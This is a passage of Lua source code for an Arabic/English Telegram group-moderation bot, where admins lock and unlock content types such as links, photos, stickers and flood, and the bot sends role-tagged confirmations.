if unlockpt[2] == "bots keed" or unlockpts[2] == "البوتات بالتقييد" then
if DevAbs:get(loolIQ..'keed_bots'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock bots keed ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـبوتٱت بٱڵتقييد \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 68, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'keed_bots'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, ' bots is already unlocked keed ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـبوتٱت بٱڵتقييد بٱڵفعـل مۧفتوحة ', 1, 'md')
end
end
end
if unlockpt[2] == "flood" or unlockpts[2] == "التكرار" then
if DevAbs:get(loolIQ..'anti-flood:'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock flood ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـتكرٱر فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'anti-flood:'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ flood is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـتكرٱر بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if unlockpt[2] == "pin" or unlockpts[2] == "التثبيت" then
if DevAbs:get(loolIQ..'bot:pin:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been unlock pin ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم فـتـۧح ٱڵـتثبيت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:del(loolIQ..'bot:pin:mute'..msg.chat_id_)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ pin is already unlocked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـتثبيت بٱڵفعـل مۧفتوحة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock gtime (%d+)$") then
local mutept = {string.match(text, "^[Ll]ock gtime (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
DevAbs:setex(loolIQ..'bot:muteall'..msg.chat_id_, num, true)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ Lock all has been enable for ("..mutept[1]..") hours ", 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ تـۖم فـتـۧح جـمـيع ٱڵـوسـآئط ڵمدة ("..mutept[1]..") ساعه ", 'md')
end
end
if text:match("^قفل الكل بالساعات (%d+)$") then
local mutept = {string.match(text, "^قفل الكل بالساعات (%d+)$")}
local hour = string.gsub(mutept[1], 'h', '')
local num1 = tonumber(hour) * 3600
local num = tonumber(num1)
DevAbs:setex(loolIQ..'bot:muteall'..msg.chat_id_, num, true)
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ Lock all has been enable for ("..mutept[1]..") hours ", 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️☻ تـۖم قفـڵ جـمـيع ٱڵـوسـآئط ڵمدة ("..mutept[1]..") ساعه ", 'md')
end
end
end
--     Source loolIQ     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") then
local mutept = {string.match(text, "^([Ll]ock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور الاساسي '
elseif is_sudoid(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱڵثٱنوي'
elseif is_sudo3(msg.sender_user_id_) then
tar = 'ٱڵمطۄر ٱلثٱڵث'
elseif is_ownerall(msg.sender_user_id_) then
tar = 'ٱڵمدير ٱڵعٱم'
elseif is_adminall(msg.sender_user_id_) then
tar = 'ٱلٱدمن ٱڵعٱم'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵمنشئ ٱلٱسٱسي'
elseif is_monshid(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧنشئ'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱڵـۧمـۧدير'
elseif is_admin(msg.sender_user_id_, msg.chat_id_) then
tar = 'ٱلٱدمـۧن'
end
local mutepts = {string.match(text, "^(قفل) (.*)$")}
if mutept[2] == "all" or mutepts[2] == "الكل" then
if not DevAbs:get(loolIQ..'bot:muteall'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock all ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ جـمـيع ٱڵـوسـآئط \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:muteall'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ all is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ جـمـيع ٱڵـوسـآئط بٱڵـتٱكيد مۘقفلة', 1, 'md')
end
end
end
if mutept[2] == "text" or mutepts[2] == "الدردشه" then
if not DevAbs:get(loolIQ..'bot:text:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock text ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـډرډشة فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:text:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ text is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـډرډشة بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "inline" or mutepts[2] == "الاونلاين" then
if not DevAbs:get(loolIQ..'bot:inline:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock inline ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱلٱۄنلٱين فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 60, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:inline:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ inline is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱۄنلٱين بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "photo" or mutepts[2] == "الصور" then
if not DevAbs:get(loolIQ..'bot:photo:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock photo ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـصـۄر فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 56, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:photo:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ photo is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـصـۄر بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "spam" or mutepts[2] == "الكلايش" then
if not DevAbs:get(loolIQ..'bot:spam:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock spam ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـكـلٱيش فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:spam:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ spam is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـكـلٱيش بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "video" or mutepts[2] == "الفيديو" then
if not DevAbs:get(loolIQ..'bot:video:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock video ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـفيډيۄ فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:video:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ video is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـفيډيۄ بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "gif" or mutepts[2] == "المتحركه" then
if not DevAbs:get(loolIQ..'bot:gifs:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock gif', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـمتحركة فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:gifs:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ gif is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـمتحركة بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "music" or mutepts[2] == "الاغاني" then
if not DevAbs:get(loolIQ..'bot:music:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock music ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱلٱغـٱنـي فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:music:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ music is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱغـٱنـي بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "voice" or mutepts[2] == "الصوت" then
if not DevAbs:get(loolIQ..'bot:voice:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock voice ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـصۄت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 56, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:voice:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ voice is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـصۄت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "links" or mutepts[2] == "الروابط" then
if not DevAbs:get(loolIQ..'bot:links:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock links ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـرۄٱبط فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:links:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ links is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـرۄٱبط بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "location" or mutepts[2] == "المواقع" then
if not DevAbs:get(loolIQ..'bot:location:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock location ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـمۄٱقع فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:location:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ location is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـمۄٱقع بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "tag" or mutepts[2] == "المعرف" then
if not DevAbs:get(loolIQ..'tags:lock'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock tag ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـمعرف فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 57, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'tags:lock'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ tag is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـمعرف بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "strict" or  mutepts[2] == "الحمايه" then
if not DevAbs:get(loolIQ..'bot:strict'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock strict ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـحمٱية فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:strict'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ strict is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـحمٱية بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "file" or mutepts[2] == "الملفات" then
if not DevAbs:get(loolIQ..'bot:document:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock file ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـمٌلفـآټ فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:document:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ file is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـمٌلفـآټ بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "abstag" or mutepts[2] == "الهاشتاك" then
if not DevAbs:get(loolIQ..'bot:abstag:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock abstag ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـهٱشتٱك فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:abstag:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ abstag is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـهٱشتٱك بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "contact" or mutepts[2] == "الجهات" then
if not DevAbs:get(loolIQ..'bot:contact:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock contact ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـجهٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 57, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:contact:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ contact is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '️❗️☻ ٱڵـجهٱت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "webpage" or mutepts[2] == "الشبكات" then
if not DevAbs:get(loolIQ..'bot:webpage:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock webpage ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـشبكٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:webpage:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ webpage is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـشبكٱت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "arabic" or mutepts[2] == "العربيه" then
if not DevAbs:get(loolIQ..'bot:arabic:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock arabic ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵـعربية فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 58, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:arabic:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ arabic is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵـعربية بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "english" or mutepts[2] == "الانكليزيه" then
if not DevAbs:get(loolIQ..'bot:english:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock english ️', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱلٱنكڵيزيه فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 61, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:english:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ english is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱلٱنكڵيزيه بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "sticker" or mutepts[2] == "الملصقات" then
if not DevAbs:get(loolIQ..'bot:sticker:mute'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock sticker ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵمڵصقٱت فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 59, string.len(msg.sender_user_id_))
end
DevAbs:set(loolIQ..'bot:sticker:mute'..msg.chat_id_,true)
else
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ sticker is already locked ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ ٱڵمڵصقٱت بٱڵفعـل مۘقفلة فيۧ ٱڵمجـمۄعة', 1, 'md')
end
end
end
if mutept[2] == "markdown" or mutepts[2] == "الماركداون" then
if not DevAbs:get(loolIQ..'markdown:lock'..msg.chat_id_) then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ Has been lock markdown ', 1, 'md')
else
local ABS_PROX = '❗️☻ تـۖم قفـڵ ٱڵمٱركدٱون فيۧ ٱڵمجـمۄعة \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..tar..' \n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..msg.sender_user_id_..' ◟ \n '
